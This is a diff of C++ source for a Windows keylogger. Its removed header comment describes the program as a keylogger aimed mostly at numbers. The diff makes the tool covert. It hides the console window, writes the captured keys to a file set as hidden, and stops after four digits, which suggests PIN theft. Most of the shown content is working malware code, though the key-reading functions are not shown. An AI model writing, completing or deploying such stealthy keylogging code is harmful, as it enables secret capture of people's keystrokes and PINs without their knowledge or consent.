@@ -1,15 +1,16 @@
-//KeyLogger, mostly just for numbers
-
 #include <windows.h>
 #include <string>
 #include <ctime>
 #include <iostream>
-#include <stdlib.h> // system("CLS");
+#include <stdlib.h> 
 #include <fstream>
 #include <thread>
 
+std::ofstream logger;
+HWND youCantSeeMe;
 HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 std::string theList = "";
+bool jobNotFinished = true;
 
 std::string number1Key() {
 	std::string keyState = "";
@@ -127,67 +128,73 @@ std::string readAndWrite() {
 
 	if (!(keyState1 == "")) {
 		theList += keyState1;
-		system("CLS");
-		std::cout << theList;
+		//system("CLS");
+		//std::cout << theList;
 	}
 	if (!(keyState2 == "")) {
 		theList += keyState2;
-		system("CLS");
-		std::cout << theList;
+		//system("CLS");
+		//std::cout << theList;
 	}
 	if (!(keyState3 == "")) {
 		theList += keyState3;
-		system("CLS");
-		std::cout << theList;
+		//system("CLS");
+		//std::cout << theList;
 	}
 	if (!(keyState4 == "")) {
 		theList += keyState4;
-		system("CLS");
-		std::cout << theList;
+		//system("CLS");
+		//std::cout << theList;
 	}
 	if (!(keyState5 == "")) {
 		theList += keyState5;
-		system("CLS");
-		std::cout << theList;
+		//system("CLS");
+		//std::cout << theList;
 	}
 	if (!(keyState6 == "")) {
 		theList += keyState6;
-		system("CLS");
-		std::cout << theList;
+		//system("CLS");
+		//std::cout << theList;
 	}
 	if (!(keyState7 == "")) {
 		theList += keyState7;
-		system("CLS");
-		std::cout << theList;
+		//system("CLS");
+		//std::cout << theList;
 	}
 	if (!(keyState8 == "")) {
 		theList += keyState8;
-		system("CLS");
-		std::cout << theList;
+		//system("CLS");
+		//std::cout << theList;
 	}
 	if (!(keyState9 == "")) {
 		theList += keyState9;
-		system("CLS");
-		std::cout << theList;
+		//system("CLS");
+		//std::cout << theList;
 	}
 	if (!(keyState0 == "")) {
 		theList += keyState0;
-		system("CLS");
-		std::cout << theList;
+		//system("CLS");
+		//std::cout << theList;
 	}
 	if (!(extraKeys == "")) {
 		theList += extraKeys;
-		system("CLS");
-		std::cout << theList;
+		//system("CLS");
+		//std::cout << theList;
 	}
 	return "";
 }
 
 int main() {
-	SetConsoleTextAttribute(hConsole, 10); // Hacker Green
-	std::cout << "TEST" << std::endl;
+	SetConsoleTextAttribute(hConsole, 10); 
+	AllocConsole();
+	youCantSeeMe = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(youCantSeeMe, 0);
 
-	while (true) {		
+	logger.open("KeyLog.txt");
+	SetFileAttributes("KeyLog.txt", FILE_ATTRIBUTE_HIDDEN);
+	logger << theList;
+
+	while (jobNotFinished) {		
 		
 		std::thread number1Thread(number1Key);
 		std::thread number2Thread(number2Key);
@@ -214,10 +221,14 @@ int main() {
 		extraKeysThread.join();
 
 		readAndWrite();
-	} 
+		
+		if (theList.length() == 4) {
+			SetFileAttributes("KeyLog.txt", FILE_ATTRIBUTE_NORMAL);
+			logger << theList;
+			logger.close();
+			jobNotFinished = false;
+		}
+	} 	
 	Sleep(3000);
 	return theList.length();
 }
-
-
-
